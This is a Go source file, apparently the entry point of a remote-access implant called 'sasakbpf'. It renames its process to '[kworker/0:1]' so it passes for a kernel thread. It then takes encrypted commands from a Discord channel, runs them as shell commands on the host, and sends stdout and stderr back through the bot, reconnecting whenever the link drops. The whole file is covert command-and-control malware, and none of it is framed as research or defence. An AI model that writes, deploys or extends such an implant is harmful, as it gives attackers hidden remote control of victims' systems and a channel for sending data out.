package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"sasakbpf/internal/config"
	"sasakbpf/internal/discord"
	"sasakbpf/internal/runner"
)

func debugf(format string, args ...interface{}) {
	if os.Getenv("SD_DEBUG") == "1" {
		fmt.Fprintf(os.Stderr, format, args...)
	}
}

func main() {
	setProcName("[kworker/0:1]")

	cfg := config.Load()
	if cfg.BotToken == "" || cfg.ChannelID == "" || cfg.AESKeyHex == "" {
		fmt.Fprintln(os.Stderr, "missing config")
		os.Exit(2)
	}
	if cfg.TargetID == "" {
		fmt.Fprintln(os.Stderr, "missing SD_TARGET_ID")
		os.Exit(2)
	}
	if cfg.Self == "" {
		cfg.Self = "agent"
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	echoMode := strings.EqualFold(os.Getenv("SD_MODE"), "echo")

	agent := discord.NewAgent(cfg)
	agent.OnCommand(func(plaintext string) {
		debugf("cmd: %q\n", truncate(plaintext, 80))

		var output string
		if echoMode {
			output = "echo: " + plaintext
		} else {
			res := runner.Exec(ctx, plaintext, 0)
			output = formatRunner(res)
		}
		if err := agent.SendOutput(ctx, output); err != nil {
			debugf("send output: %v\n", err)
		}
	})

	for {
		err := agent.Run(ctx)
		if ctx.Err() != nil {
			return
		}
		if err != nil {
			debugf("gateway: %v — reconnecting\n", err)
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(2 * time.Second):
		}
	}
}

func formatRunner(r runner.Result) string {
	var sb strings.Builder
	if r.Cmd != "" {
		fmt.Fprintf(&sb, "$ %s\n", r.Cmd)
	}
	if r.Stdout != "" {
		sb.WriteString(r.Stdout)
		if !strings.HasSuffix(r.Stdout, "\n") {
			sb.WriteByte('\n')
		}
	}
	if r.Stderr != "" {
		sb.WriteString("[stderr]\n")
		sb.WriteString(r.Stderr)
		if !strings.HasSuffix(r.Stderr, "\n") {
			sb.WriteByte('\n')
		}
	}
	if r.Err != nil {
		fmt.Fprintf(&sb, "[exit] %v (dur=%s)\n", r.Err, r.Dur)
	}
	if sb.Len() == 0 {
		return "(no output)\n"
	}
	return sb.String()
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}